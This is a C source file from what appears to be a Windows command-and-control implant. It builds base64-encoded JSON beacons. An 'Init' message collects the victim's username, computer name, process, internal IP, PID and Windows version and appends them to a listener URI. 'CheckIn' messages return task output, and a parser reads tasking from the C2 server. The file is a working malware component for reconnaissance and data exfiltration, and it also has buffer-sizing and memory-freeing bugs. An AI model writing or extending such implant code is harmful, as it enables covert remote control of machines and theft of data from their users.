//
// Created by j4ck on 3/15/24.
//
#include <windows.h>
#include <stdio.h>
#include <math.h>
#include "../Include/Agent.h"
#include "../Lib/base64/base64.h"
#include "../Lib/cJSON/cJSON.h"

#define NELEMS(x)  (sizeof(x) / sizeof(x[0]))

// TODO Switch to ASCII CHAR
BOOL JsonCreateInitFromAgentInfo(IN AgentInfo agentInfo, IN OUT PBYTE *pBuffer) {
    char *paUserName = malloc((wcstombs(NULL, agentInfo.pUserName, 0) + 1) * sizeof(char));
    wcstombs(paUserName, agentInfo.pUserName, wcstombs(NULL, agentInfo.pUserName, 0) + 1);

    char *paComputerName = malloc((wcstombs(NULL, agentInfo.pComputerName, 0) + 1) * sizeof(char));
    wcstombs(paComputerName, agentInfo.pComputerName, wcstombs(NULL, agentInfo.pComputerName, 0) + 1);

    char *paProcessName = malloc((wcstombs(NULL, agentInfo.pProcessName, 0) + 1) * sizeof(char));
    wcstombs(paProcessName, agentInfo.pProcessName, wcstombs(NULL, agentInfo.pProcessName, 0) + 1);
    // Convert DWORD to PCHAR
    char strPID[(int)((ceil(log10(agentInfo.PID))+1)*sizeof(char))];
    sprintf(strPID, "%ld", agentInfo.PID);

    char strWindowsVersion[(int)((ceil(log10(agentInfo.WindowsVersion))+1)*sizeof(char))];
    sprintf(strWindowsVersion, "%ld", agentInfo.WindowsVersion);



    cJSON *root = cJSON_CreateObject();

    cJSON *data = cJSON_CreateObject();

    cJSON_AddItemToObject(root, "Data", data); // Supply agent information.
    cJSON_AddStringToObject(data, "Username", paUserName);
    cJSON_AddStringToObject(data, "ComputerName", paComputerName);
    cJSON_AddStringToObject(data, "ProcessName", paProcessName);
    cJSON_AddStringToObject(data, "InternalIp", agentInfo.pInternalIp);
    cJSON_AddStringToObject(data, "PID", strPID);
    cJSON_AddStringToObject(data, "WindowsVersion", strWindowsVersion);

    cJSON_AddStringToObject(root, "Head", "Init"); // Head: Init = Initialize new Agent.

    //*buffer = (unsigned char*)cJSON_Print(root);
    unsigned char* pJson = (unsigned char*)cJSON_Print(root);

    int out_size_a = b64e_size(strlen((char*)pJson)) + 1;

    unsigned char *pBase64 = malloc( (sizeof(char) * out_size_a) );
    b64_encode(pJson, strlen((char*)pJson), pBase64);

    PBYTE outBuffer = calloc((strlen(Agent->Config.ListenerUri) + strlen((char*)pBase64)), sizeof(char));
    strcpy((char*)outBuffer, Agent->Config.ListenerUri);
    strcat((char*)outBuffer, (char*)pBase64);



    *pBuffer = outBuffer;

    // Cleanup
    free(pJson);
    free(pBase64);
    free(root);
    free(data);

    return TRUE;
}


BOOL JsonCreateCheckIn(OUT PBYTE *pOutputBuffer, IN DWORD dwTaskId, IN PCHAR pTaskArgs, IN PBYTE pTaskOutput) {
    char strTaskId[32];
    sprintf(strTaskId,"%lx",dwTaskId);

    cJSON *data = cJSON_CreateObject();
    cJSON_AddStringToObject(data, "Id", Agent->Config.UniqueId); // Supply agent information.
    cJSON_AddStringToObject(data, "TaskId", strTaskId); // Supply agent information.
    if (pTaskArgs) {

        cJSON_AddStringToObject(data, "TaskArgs", pTaskArgs); // Supply agent information.
    } else {
        cJSON_AddStringToObject(data, "TaskArgs", ""); // Supply agent information.
    }
    if (pTaskOutput) {
        cJSON_AddStringToObject(data, "TaskOutput", (char*) pTaskOutput); // Supply agent information.
    } else {
        cJSON_AddStringToObject(data, "TaskOutput", ""); // Supply agent information.
    }

    cJSON *root = cJSON_CreateObject();
    cJSON_AddItemToObject(root, "Data", data); // Supply agent information.
    cJSON_AddStringToObject(root, "Head", "CheckIn"); // Supply agent information.

    unsigned char* pJson = (unsigned char*)cJSON_Print(root);
    //printf("[+] JSON %s\n", pJson);
    int out_size_a = b64e_size(strlen((char*)pJson)) + 1;

    unsigned char *pBase64 = malloc( (sizeof(char) * out_size_a) );
    b64_encode(pJson, strlen((char*)pJson), pBase64);

    PBYTE outBuffer = calloc((strlen(Agent->Config.ListenerUri) + strlen((char*)pBase64)), sizeof(char));
    strcpy((char*)outBuffer, Agent->Config.ListenerUri);
    strcat((char*)outBuffer, (char*)pBase64);



    *pOutputBuffer = outBuffer;

    // Cleanup
    free(pJson);
    free(pBase64);
    free(root);
    free(data);
    return TRUE;
}





BOOL JsonParseResponseFromC2(IN PCHAR responseStringJson, OUT PDWORD dwTaskId, OUT PCHAR *pTaskArgs) {
    // Parse the JSON string
    cJSON *root = cJSON_Parse(responseStringJson);
    if (root == NULL) {
        printf("Error parsing JSON: %s\n", cJSON_GetErrorPtr());
        return 1;
    }

    // Get the "Head" value
    cJSON *head = cJSON_GetObjectItemCaseSensitive(root, "Head");
    if (cJSON_IsString(head) && (head->valuestring != NULL)) {
        *dwTaskId = atoi(head->valuestring);
        //printf("[+] JsonParseResponseFromC2 TaskId: %s\n", head->valuestring);
    }

    cJSON *data = cJSON_GetObjectItemCaseSensitive(root, "Data");
    if (cJSON_IsString(data) && (data->valuestring != NULL)) {
        PCHAR pTempTaskArgs = calloc(strlen(data->valuestring), sizeof(char));
        strcpy(pTempTaskArgs, data->valuestring);
        *pTaskArgs = (PCHAR)pTempTaskArgs;
        //printf("[+] JsonParseResponseFromC2 Assigned TaskArgs: %s\n", pTempTaskArgs);
    }

    return 0;
}